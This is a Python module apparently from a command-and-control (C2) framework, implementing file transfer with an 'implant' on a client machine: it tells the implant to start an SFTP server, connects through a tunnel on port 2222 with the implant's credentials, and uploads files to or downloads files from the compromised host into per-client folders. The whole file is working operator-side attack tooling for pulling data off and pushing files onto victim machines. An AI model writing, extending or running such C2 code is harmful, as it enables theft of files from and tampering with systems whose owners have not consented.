import os
import base64
import json
import logging
from typing import Tuple, Optional, Dict, Any
from ..session.client_session import ClientSession
import paramiko
from .tunnel_handler import get_tunnel_manager 

logger = logging.getLogger('c2.FileTransfer')
paramiko_logger = logging.getLogger('paramiko')
paramiko_logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
paramiko_logger.addHandler(console_handler)
class FileTransfer:
    def __init__(self, download_dir: str):
        self.download_dir = download_dir
        os.makedirs(download_dir, exist_ok=True)
        self.tunnel_manager = get_tunnel_manager()

    def _setup_tunnel(self, client: 'ClientSession', port: int = 2222) -> bool:
        """Setup SFTP tunnel with implant"""
        try:
            # Start SFTP server on implant (implant will handle port forwarding)
            response = client.send_command("!sftp start")
            if "SFTP server started" not in response:
                return False

            # No need to create tunnel here - implant handles it
            return True

        except Exception as e:
            logger.error(f"Tunnel setup error: {e}")
            return False

    def _cleanup_tunnel(self, client: 'ClientSession', port: int = 2222):
        """Cleanup SFTP tunnel"""
        try:
            # Stop SFTP server on implant
            client.send_command("!sftp stop")
            
            # Close tunnel
            tunnel_id = f"{client.id}__{port}"
            self.tunnel_manager.close_tunnel(tunnel_id)
        except Exception as e:
            logger.error(f"Tunnel cleanup error: {e}")

    def upload_file(self, client: 'ClientSession', local_path: str, remote_path: str) -> Tuple[bool, str]:
        """Upload file using SFTP tunnel"""
        try:
            if not self._setup_tunnel(client):
                return False, "Failed to setup SFTP tunnel"

            # Connect to forwarded port with authentication
            transport = paramiko.Transport(('127.0.0.1', 2222))
            # Use implant credentials for authentication
            transport.connect(
                username=client.config['username'],  # Use same credentials as implant
                password=client.config['password']
            )
            sftp = paramiko.SFTPClient.from_transport(transport)

            try:
                sftp.put(local_path, remote_path)
                return True, f"File uploaded successfully to {remote_path}"
            finally:
                sftp.close()
                transport.close()
                self._cleanup_tunnel(client)

        except Exception as e:
            logger.error(f"Upload error: {e}")
            return False, str(e)

    def download_file(self, client: 'ClientSession', remote_path: str) -> Tuple[bool, str, str]:
        """Download file using SFTP tunnel"""
        try:
            if not self._setup_tunnel(client):
                return False, "Failed to setup SFTP tunnel", ""

            
            # Create download directory
            client_dir = os.path.join(self.download_dir, client.id)
            os.makedirs(client_dir, exist_ok=True)
            local_path = os.path.join(client_dir, os.path.basename(remote_path))

            # Connect to forwarded port with authentication
            transport = paramiko.Transport(('127.0.0.1', 2222))
            transport.connect(
                username=client.config['username'],  # Use same credentials as implant
                password=client.config['password']
            )
            
            logger.debug("Transport connected, creating SFTP client")
            print(paramiko.SFTPClient.from_transport(transport))
            sftp = paramiko.SFTPClient.from_transport(transport)
            try:
                print(remote_path)
                sftp.get(remote_path, local_path)
                return True, f"File downloaded to {local_path}", local_path
            finally:
                sftp.close()
                transport.close()
                self._cleanup_tunnel(client)

        except Exception as e:
            logger.error(f"Download error: {e}")
            return False, str(e), ""